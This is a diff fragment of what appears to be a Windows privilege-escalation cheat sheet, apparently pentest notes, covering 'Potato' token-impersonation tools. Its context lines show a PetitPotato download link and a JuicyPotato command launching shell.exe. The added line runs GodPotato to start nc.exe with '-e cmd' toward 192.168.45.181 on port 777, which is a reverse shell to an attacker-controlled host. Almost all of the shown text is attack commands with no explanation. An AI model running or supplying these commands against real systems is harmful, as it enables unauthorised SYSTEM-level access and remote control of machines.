@@ -68,6 +68,8 @@ https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
 
 
 .\Juicy.Potato.x86.exe -t * -p shell.exe -l 1338 -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
+
+\GodPotato-NET4.exe -cmd "C:\windows\temp\a\nc.exe -e cmd 192.168.45.181 777"
 ```
 
 ## SeBackupPriv
